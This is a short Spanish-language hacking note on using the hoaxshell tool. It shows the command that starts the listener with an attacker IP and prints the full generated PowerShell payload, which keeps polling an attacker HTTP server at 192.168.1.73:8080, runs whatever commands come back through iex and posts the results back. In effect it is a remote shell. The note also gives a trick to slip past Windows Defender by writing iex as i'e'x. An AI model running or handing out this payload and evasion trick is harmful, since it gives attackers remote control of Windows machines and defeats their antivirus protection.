---------------
- tags: #Windows #Av #Defender #hoaxshell #RCE #cmd #powershell
-------------------

### Usando hoaxshell (de github)
-r: Te da el ouput en "raw". 
-s: IP de atacante

```
python3 hoaxshell.py -s 192.168.1.73 -r
```

*Output:*

```
$s='192.168.1.73:8080';$i='2f5ef625-0dd0df8f-3bce6450';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/2f5ef625 -Headers @{"X-a31e-788c"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/0dd0df8f -Headers @{"X-a31e-788c"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/3bce6450 -Method POST -Headers @{"X-a31e-788c"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

***Reemplazamos iex por i'e'x para bypassear Windows Defender***




